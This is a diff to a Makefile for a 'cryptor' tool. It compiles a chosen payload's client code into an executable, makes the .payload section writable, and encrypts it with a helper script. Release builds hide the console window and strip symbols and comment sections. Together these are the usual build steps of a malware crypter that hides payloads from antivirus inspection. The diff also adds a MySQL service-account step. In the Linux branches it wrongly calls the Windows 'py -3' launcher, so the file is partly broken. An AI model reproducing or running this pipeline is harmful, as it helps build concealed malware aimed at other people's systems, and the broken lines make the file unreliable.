@@ -1,3 +1,4 @@
+#@echo off
 # Make file that builds the working cryptor
 #
 # Copyright (C) 2020  @Qu3b411
@@ -31,23 +32,25 @@ ifeq ($(OS),Windows_NT)
 	@py -3 ./MFScripts/install.py
 	@echo [*] Checking Config File for server requirements. This may require configration!
 	@py -3 ./MFScripts/config.py
-	@echo Config file found at expected location!
+	@echo [*] Configuring MySQL Service Account!
+	@py -3 ./MFScripts/MySQLDatabaseConfig.py
+	@echo [*] Config file found at expected location!
 	@echo [*] Generating keys...
 	@py -3 ./MFScripts/KeyGen.py
-	@echo Keys Generated!
-	@echo Header files Generated.
+	@echo [*] Keys Generated!
+	@echo [*] Header files Generated.
 	@echo [*] LINKING FILE...
 	@# We are going to use a sub directory and make both objects
-	gcc -c  $(SrcPath)/main.c  -o $(Dpath)/cryptor.o 
-	gcc -c  ./payload/$(Payload)/client/*.c  -o $(Dpath)/payload.o $(INC)
+	@gcc -c  $(SrcPath)/main.c  -o $(Dpath)/cryptor.o 
+	@gcc -c  ./payload/$(Payload)/client/*.c  -o $(Dpath)/payload.o $(INC)
 
-	gcc -g -T $(SrcPath)/win32Linker.ld   $(Dpath)/cryptor.o $(Dpath)/payload.o -o $(Dpath)/cryptor.exe -lCrypt32 -lWs2_32 -lBCrypt
+	@gcc -g -T $(SrcPath)/win32Linker.ld   $(Dpath)/cryptor.o $(Dpath)/payload.o -o $(Dpath)/cryptor.exe -lCrypt32 -lWs2_32 -lBCrypt
 	@echo COMPLETED: file has been linked into an executable format!
 
 	@echo [*] REMOVING READONLY PROTECTION FROM .payload...
-	objcopy --set-section-flags .payload=code,data,alloc,contents,load $(Dpath)/cryptor.exe $(Dpath)/cryptor.exe
-	@echo COMPLETED, .payload section is now writable
-
+	@objcopy --set-section-flags .payload=code,data,alloc,contents,load $(Dpath)/cryptor.exe $(Dpath)/cryptor.exe
+	@echo [*] COMPLETED: .payload section is now writable
+	
 	@echo [*] Encrypting .payload section...
 	@py -3 ./MFScripts/cryptPayload.py $(Dpath)
 
@@ -58,21 +61,23 @@ else
 	@python3 ./MFScripts/install.py
 	@echo [*] Checking Config File for server requirements. This may require configration!
 	@python3 ./MFScripts/config.py
-	@echo Config file found at expected location!
+	@echo [*] Configuring MySQL Service Account!
+	@py -3 ./MFScripts/MySQLDatabaseConfig.py
+	@echo [*] Config file found at expected location!
 	@echo [*] Generating keys...
 	@python3 ./MFScripts/KeyGen.py
-	@echo Keys Generated!
-	@echo Header files Generated.
+	@echo [*] Keys Generated!
+	@echo [*] Header files Generated.
 	@echo [*] LINKING FILE...
 	@# We are going to use a sub directory and make both objects
-	gcc -c  $(SrcPath)/main.c  -o $(Dpath)/cryptor.o 
-	gcc -c  ./payload/$(Payload)/client/*.c  -o $(Dpath)/payload.o $(INC)
-	gcc -g -T $(SrcPath)/linuxLinker.ld  $(Dpath)/cryptor.o $(Dpath)/payload.o -o $(Dpath)/cryptor.exe 
-	
-	@echo COMPLETED: file has been linked into a mn executable format!
+	@gcc -c  $(SrcPath)/main.c  -o $(Dpath)/cryptor.o 
+	@gcc -c  ./payload/$(Payload)/client/*.c  -o $(Dpath)/payload.o $(INC)
+	@gcc -g -T $(SrcPath)/linuxLinker.ld  $(Dpath)/cryptor.o $(Dpath)/payload.o -o $(Dpath)/cryptor.exe
+
+	@echo [*] COMPLETED: file has been linked into a mn executable format!
 	@echo [*] REMOVING READONLY PROTECTION FROM .payload...
-	objcopy --set-section-flags .payload=code,data,alloc,contents,load $(Dpath)/cryptor.exe $(Dpath)/cryptor.exe
-	@echo COMPLETED, .payload section is now writable
+	@objcopy --set-section-flags .payload=code,data,alloc,contents,load $(Dpath)/cryptor.exe $(Dpath)/cryptor.exe
+	@echo [*] COMPLETED: .payload section is now writable
 
 	@echo [*] Encrypting .payload section...
 	@python3 ./MFScripts/cryptPayload.py $(Dpath)
@@ -87,25 +92,27 @@ ifeq ($(OS),Windows_NT)
 	@py -3 ./MFScripts/install.py
 	@echo [*] Checking Config File for server requirements. This may require configration!
 	@py -3 ./MFScripts/config.py
-	@echo Config file found at expected location!
+	@echo [*] Configuring MySQL Service Account!
+	@py -3 ./MFScripts/MySQLDatabaseConfig.py
+	@echo [*] Config file found at expected location!
 	@echo [*] Generating keys...
 	@py -3 ./MFScripts/KeyGen.py
-	@echo Keys Generated!
-	@echo Header files Generated.
+	@echo [*] Keys Generated!
+	@echo [*] Header files Generated.
 
 	@echo [*] LINKING FILE...
 	
-	gcc -c  $(SrcPath)/main.c  -o $(Rpath)/cryptor.o
-	gcc -c  ./payload/$(Payload)/client/*.c  -o $(Rpath)/payload.o $(INC)
+	@gcc -c  $(SrcPath)/main.c  -o $(Rpath)/cryptor.o
+	@gcc -c  ./payload/$(Payload)/client/*.c  -o $(Rpath)/payload.o $(INC)
 	
-	gcc -s -static -mwindows -fvisibility=hidden -T $(SrcPath)/win32Linker.ld  $(Rpath)/cryptor.o $(Rpath)/payload.o -o $(Rpath)/cryptor.exe -lCrypt32 -lWs2_32 -lBCrypt
-	@echo COMPLETED: file has been linked into a mn executable format!
-	strip -R .comment -R .note $(Rpath)/cryptor.exe
-	strip -s $(Rpath)/cryptor.exe
+	@gcc -s -static -mwindows -fvisibility=hidden -T $(SrcPath)/win32Linker.ld  $(Rpath)/cryptor.o $(Rpath)/payload.o -o $(Rpath)/cryptor.exe -lCrypt32 -lWs2_32 -lBCrypt 
+	@echo [*] COMPLETED: file has been linked into a mn executable format!
+	@strip -R .comment -R .note $(Rpath)/cryptor.exe
+	@strip -s $(Rpath)/cryptor.exe
 
 	@echo [*] REMOVING READONLY PROTECTION FROM .payload...
-	objcopy --set-section-flags .payload=code,data,alloc,contents,load $(Rpath)/cryptor.exe $(Rpath)/cryptor.exe
-	@echo COMPLETED, .payload section is now writable
+	@objcopy --set-section-flags .payload=code,data,alloc,contents,load $(Rpath)/cryptor.exe $(Rpath)/cryptor.exe
+	@echo [*] COMPLETED: .payload section is now writable
 
 	@echo [*] Encrypting .payload section...
 	@py -3 ./MFScripts/cryptPayload.py $(Rpath)
@@ -116,25 +123,27 @@ else
 	@python3  ./MFScripts/install.py
 	@echo [*] Checking Config File for server requirements. This may require configration!
 	@python3 ./MFScripts/config.py
-	@echo Config file found at expected location!
+	@echo [*] Configuring MySQL Service Account!
+	@py -3 ./MFScripts/MySQLDatabaseConfig.py
+	@echo [*] Config file found at expected location!
 	@echo [*] Generating keys...
 	@python3 ./MFScripts/KeyGen.py
-	@echo Keys Generated!
-	@echo Header files Generated.
+	@echo [*] Keys Generated!
+	@echo [*] Header files Generated.
 
 	@echo [*] LINKING FILE...
 	
-	gcc -c  $(SrcPath)/main.c  -o $(Rpath)/cryptor.o
-	gcc -c  ./payload/$(Payload)/client/*.c  -o $(Rpath)/payload.o $(INC)
+	@gcc -c  $(SrcPath)/main.c  -o $(Rpath)/cryptor.o
+	@gcc -c  ./payload/$(Payload)/client/*.c  -o $(Rpath)/payload.o $(INC)
 	
-	gcc -s -static -mwindows -fvisibility=hidden -T $(SrcPath)/linuxLinker.ld   $(Rpath)/cryptor.o $(Rpath)/payload.o -o $(Rpath)/cryptor.exe
-	@echo COMPLETED: file has been linked into a mn executable format!
-	strip -R .comment -R .note $(Rpath)/cryptor.exe
-	strip -s $(Rpath)/cryptor.exe
+	@gcc -s -static -mwindows -fvisibility=hidden -T $(SrcPath)/linuxLinker.ld   $(Rpath)/cryptor.o $(Rpath)/payload.o -o $(Rpath)/cryptor.exe
+	@echo [*] COMPLETED: file has been linked into a mn executable format!
+	@strip -R .comment -R .note $(Rpath)/cryptor.exe
+	@strip -s $(Rpath)/cryptor.exe
 
 	@echo [*] REMOVING READONLY PROTECTION FROM .payload...
-	objcopy --set-section-flags .payload=code,data,alloc,contents,load $(Rpath)/cryptor.exe $(Rpath)/cryptor.exe
-	@echo COMPLETED, .payload section is now writable
+	@objcopy --set-section-flags .payload=code,data,alloc,contents,load $(Rpath)/cryptor.exe $(Rpath)/cryptor.exe
+	@echo [*] COMPLETED: .payload section is now writable
 
 	@echo [*] Encrypting .payload section...
 	@python3 ./MFScripts/cryptPayload.py $(Rpath)
